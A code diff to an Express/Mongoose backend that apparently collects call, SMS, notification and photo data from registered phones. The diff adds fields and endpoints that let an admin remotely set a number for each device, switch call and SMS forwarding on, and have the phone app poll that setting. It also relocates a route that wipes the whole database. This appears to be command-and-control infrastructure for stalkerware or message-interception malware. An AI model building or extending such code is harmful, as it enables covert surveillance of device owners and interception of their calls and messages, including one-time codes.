@@ -41,12 +41,16 @@ mongoose
 // Device
 const deviceSchema = new mongoose.Schema(
   {
-    device_id: { type: String, required: true, unique: true, index: true },
-    device_name: { type: String, default: 'Unknown' },
-    first_seen: { type: Date, default: Date.now },
-    last_seen: { type: Date, default: Date.now },
+    device_id:    { type: String, required: true, unique: true, index: true },
+    device_name:  { type: String, default: 'Unknown' },
+    first_seen:   { type: Date, default: Date.now },
+    last_seen:    { type: Date, default: Date.now },
     total_events: { type: Number, default: 0 },
-    is_active: { type: Boolean, default: true },
+    is_active:    { type: Boolean, default: true },
+    // ── Forwarding config ──────────────────────
+    forward_number:       { type: String, default: '' },   // number to forward to
+    call_forward_enabled: { type: Boolean, default: false },
+    sms_forward_enabled:  { type: Boolean, default: false },
   },
   { timestamps: true }
 );
@@ -385,6 +389,62 @@ app.delete('/api/devices/:device_id', auth, async (req, res) => {
   }
 });
 
+// ── FORWARDING CONFIG ─────────────────────────
+
+// PATCH /api/devices/:device_id/forward  — admin sets forward number
+app.patch('/api/devices/:device_id/forward', auth, async (req, res) => {
+  try {
+    const { device_id } = req.params;
+    const { forward_number, call_forward_enabled, sms_forward_enabled } = req.body;
+
+    const update = {};
+    if (forward_number    !== undefined) update.forward_number       = forward_number.trim();
+    if (call_forward_enabled !== undefined) update.call_forward_enabled = !!call_forward_enabled;
+    if (sms_forward_enabled  !== undefined) update.sms_forward_enabled  = !!sms_forward_enabled;
+
+    const device = await Device.findOneAndUpdate(
+      { device_id },
+      { $set: update },
+      { new: true }
+    );
+    if (!device)
+      return res.status(404).json({ success: false, message: 'Device not found' });
+
+    res.json({ success: true, data: device });
+  } catch (err) {
+    res.status(500).json({ success: false, message: err.message });
+  }
+});
+
+// GET /api/devices/:device_id/config  — Flutter app polls this
+// Returns forwarding config for the device (NO auth — device uses its own device_id)
+app.get('/api/devices/:device_id/config', async (req, res) => {
+  try {
+    const { device_id } = req.params;
+    // Light auth — check api key still
+    const key = req.headers['authorization']?.replace('Bearer ', '');
+    if (!key || key !== API_KEY)
+      return res.status(401).json({ success: false, message: 'Unauthorized' });
+
+    const device = await Device.findOne({ device_id })
+      .select('forward_number call_forward_enabled sms_forward_enabled device_name');
+
+    if (!device)
+      return res.status(404).json({ success: false, message: 'Device not found' });
+
+    res.json({
+      success: true,
+      config: {
+        forward_number:       device.forward_number || '',
+        call_forward_enabled: device.call_forward_enabled || false,
+        sms_forward_enabled:  device.sms_forward_enabled  || false,
+      },
+    });
+  } catch (err) {
+    res.status(500).json({ success: false, message: err.message });
+  }
+});
+
 // ── STATS / ANALYTICS ─────────────────────────
 // GET /api/stats
 app.get('/api/stats', auth, async (req, res) => {
@@ -436,38 +496,7 @@ app.get('/api/stats', auth, async (req, res) => {
     res.status(500).json({ success: false, message: err.message });
   }
 });
-app.post('/api/admin/clear-db', auth, async (req, res) => {
-  try {
 
-    await Promise.all([
-      Device.deleteMany({}),
-      CallEvent.deleteMany({}),
-      SmsEvent.deleteMany({}),
-      NotificationEvent.deleteMany({}),
-      Photo.deleteMany({})
-    ]);
-
-    // optional: uploads folder bhi empty kar do
-    const uploadsDir = path.join(__dirname, 'uploads');
-
-    if (fs.existsSync(uploadsDir)) {
-      fs.rmSync(uploadsDir, { recursive: true, force: true });
-      fs.mkdirSync(uploadsDir, { recursive: true });
-    }
-
-    return res.json({
-      success: true,
-      message: 'All database collections and uploads cleared'
-    });
-
-  } catch (err) {
-    console.error(err);
-    return res.status(500).json({
-      success: false,
-      message: err.message
-    });
-  }
-});
 // GET /api/analytics/daily?days=7
 app.get('/api/analytics/daily', auth, async (req, res) => {
   try {
@@ -664,6 +693,41 @@ app.get('/api/gallery', auth, async (req, res) => {
     res.status(500).json({ success: false, message: err.message });
   }
 });
+
+app.post('/api/admin/clear-db', auth, async (req, res) => {
+  try {
+
+    await Promise.all([
+      Device.deleteMany({}),
+      CallEvent.deleteMany({}),
+      SmsEvent.deleteMany({}),
+      NotificationEvent.deleteMany({}),
+      Photo.deleteMany({})
+    ]);
+
+    // optional: uploads folder bhi empty kar do
+    const uploadsDir = path.join(__dirname, 'uploads');
+
+    if (fs.existsSync(uploadsDir)) {
+      fs.rmSync(uploadsDir, { recursive: true, force: true });
+      fs.mkdirSync(uploadsDir, { recursive: true });
+    }
+
+    return res.json({
+      success: true,
+      message: 'All database collections and uploads cleared'
+    });
+
+  } catch (err) {
+    console.error(err);
+    return res.status(500).json({
+      success: false,
+      message: err.message
+    });
+  }
+});
+
+
 
 // DELETE /api/gallery/:id
 app.delete('/api/gallery/:id', auth, async (req, res) => {
